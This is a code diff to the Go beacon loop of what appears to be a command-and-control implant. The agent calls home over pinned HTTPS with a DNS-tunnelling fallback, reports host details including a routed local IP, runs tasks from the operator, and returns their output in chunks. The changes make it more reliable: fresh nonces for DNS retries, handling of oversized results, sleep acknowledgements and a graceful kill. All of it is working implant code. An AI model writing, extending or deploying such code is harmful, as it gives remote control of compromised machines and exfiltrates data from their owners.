@@ -1,8 +1,11 @@
 package agent
 
 import (
+	"errors"
 	"log"
 	"math/rand"
+	"net"
+	"net/url"
 	"os"
 	"runtime"
 	"strconv"
@@ -40,10 +43,12 @@ var (
 // Run starts the beacon loop. It blocks until a kill task is received or the process exits.
 func Run(cfg *Config) {
 	client := newPinnedClient(cfg.CertFingerprint)
+	hostIP := routedHostIP(cfg.ServerURL)
 	var pendingResults []*protocol.TaskResult
 	consecutiveFailures := 0
 	var lastFailureLog time.Time
 	skipSleep := false
+	terminateAfterResults := false
 
 	for {
 		// Skip the sleep when we have a fresh result to deliver, so the output
@@ -76,13 +81,15 @@ func Run(cfg *Config) {
 			pendingResult = pendingResults[0]
 		}
 		beacon := &protocol.Beacon{
-			AgentID:    cfg.AgentID,
-			Timestamp:  time.Now().Unix(),
-			Nonce:      nonce,
-			Hostname:   hostname(),
-			OS:         runtime.GOOS,
-			Arch:       runtime.GOARCH,
-			TaskOutput: pendingResult,
+			AgentID:      cfg.AgentID,
+			Timestamp:    time.Now().Unix(),
+			Nonce:        nonce,
+			Hostname:     hostname(),
+			OS:           runtime.GOOS,
+			Arch:         runtime.GOARCH,
+			HostIP:       hostIP,
+			SleepSeconds: cfg.SleepSeconds,
+			TaskOutput:   pendingResult,
 		}
 
 		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
@@ -93,7 +100,35 @@ func Run(cfg *Config) {
 		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
 		if err != nil {
 			if cfg.DNSDomain != "" {
-				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
+				// A failed HTTPS call can mean the response was lost after the
+				// server accepted the beacon. Use a fresh nonce for DNS fallback so
+				// the retry is not rejected as a replay.
+				dnsNonce, nonceErr := beaconNonceFn()
+				if nonceErr != nil {
+					continue
+				}
+				beacon.Nonce = dnsNonce
+				dnsEncoded, encodeErr := protocol.EncodeBeacon(beacon, cfg.Secret)
+				if encodeErr != nil {
+					continue
+				}
+				respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
+				if errors.Is(err, errDNSBeaconTooLarge) && pendingResult != nil {
+					// Large results cannot be transported safely through DNS. Replace
+					// the blocking result with an explicit terminal error so later
+					// tasks can continue once HTTPS is unavailable.
+					replacement := &protocol.TaskResult{
+						TaskID: pendingResult.TaskID,
+						Type:   pendingResult.Type,
+						Error:  "result exceeded DNS fallback capacity; reconnect HTTPS and rerun the task",
+					}
+					pendingResults[0] = replacement
+					beacon.TaskOutput = replacement
+					dnsEncoded, encodeErr = protocol.EncodeBeacon(beacon, cfg.Secret)
+					if encodeErr == nil {
+						respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
+					}
+				}
 				if err != nil {
 					consecutiveFailures++
 					suspendPathBrowseOnFailure()
@@ -121,6 +156,9 @@ func Run(cfg *Config) {
 				skipSleep = true
 			}
 		}
+		if terminateAfterResults && len(pendingResults) == 0 {
+			return
+		}
 
 		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
 		if err != nil || task.Type == "noop" {
@@ -131,6 +169,12 @@ func Run(cfg *Config) {
 			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
 				cfg.SleepSeconds = secs
 			}
+			pendingResults = append(pendingResults, &protocol.TaskResult{
+				TaskID: task.ID,
+				Type:   task.Type,
+				Output: "sleep acknowledged",
+			})
+			skipSleep = true
 			continue
 		}
 
@@ -138,7 +182,7 @@ func Run(cfg *Config) {
 		pendingResults = append(pendingResults, chunkTaskResult(result)...)
 
 		if task.Type == "kill" {
-			return
+			terminateAfterResults = true
 		}
 
 		// Deliver the result on the next beacon without sleeping first.
@@ -163,6 +207,7 @@ func chunkTaskResult(result *protocol.TaskResult) []*protocol.TaskResult {
 			TaskID:     result.TaskID,
 			Type:       result.Type,
 			Output:     result.Output[start:end],
+			Warning:    result.Warning,
 			ChunkIndex: i,
 			ChunkTotal: total,
 		})
@@ -209,6 +254,31 @@ func queueAsyncTypedProgress(taskID, resultType, label, message string) {
 func hostname() string {
 	h, _ := os.Hostname()
 	return h
+}
+
+// routedHostIP reports the local interface address the operating system would
+// use to reach the configured server. A UDP dial selects the route without
+// sending traffic and avoids reporting the server's callback address as the
+// agent host address.
+func routedHostIP(serverURL string) string {
+	u, err := url.Parse(serverURL)
+	if err != nil || u.Hostname() == "" {
+		return ""
+	}
+	port := u.Port()
+	if port == "" {
+		port = "443"
+	}
+	conn, err := net.DialTimeout("udp", net.JoinHostPort(u.Hostname(), port), time.Second)
+	if err != nil {
+		return ""
+	}
+	defer conn.Close()
+	addr, ok := conn.LocalAddr().(*net.UDPAddr)
+	if !ok || addr.IP == nil || addr.IP.IsUnspecified() {
+		return ""
+	}
+	return addr.IP.String()
 }
 
 func fastBeaconActive() bool {
